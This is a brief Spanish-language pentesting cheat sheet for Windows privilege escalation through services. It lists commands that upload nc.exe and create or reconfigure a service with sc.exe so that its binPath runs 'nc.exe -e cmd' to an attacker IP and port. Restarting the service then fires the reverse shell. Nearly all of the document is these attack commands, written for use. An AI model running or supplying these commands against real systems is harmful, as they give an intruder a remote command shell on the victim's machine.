- Pruebo, si veo es que puedo manipular
```powershell
services
```

- Exploit
```bash
subes nc.exe

sc.exe create reverse binPath="RUTA_nc.exe -e cmd IP PORT"
```


- Si no manipulo un services, hasta que uno deje

```powershell
sc.exe config SERVICIO binPath="RUTA_nc.exe -e cmd IP PORT"

sc.exe stop SERVICIO

sc.exe start SERVICIO
```

